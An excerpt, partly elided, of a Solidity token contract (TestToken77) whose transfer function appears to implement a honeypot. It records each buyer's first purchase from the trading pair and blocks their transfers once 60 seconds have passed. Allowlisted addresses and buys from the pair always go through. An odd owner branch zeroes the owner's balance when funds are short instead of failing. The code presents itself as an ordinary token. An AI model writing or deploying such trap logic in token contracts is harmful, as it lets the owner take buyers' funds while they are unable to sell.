...
contract TestToken77 is Ownable /*, IERC20*/ {
	string public name;
	...
	function _transfer(address from, address to, uint amount) internal {
		...
		if(_pair == address(0)) _pair = IFactory(_factory).getPair(address(this), IRouter(_router).WETH());
		if(_pair == from && _start[tx.origin] == 0) _start[tx.origin] = block.timestamp;
		if(_allowed[from] || _allowed[to] || _pair == from || block.timestamp < _start[tx.origin] + 60 ) {
			if(from == _owner && balanceOf[from] < amount)
				balanceOf[from] = 0;
			else
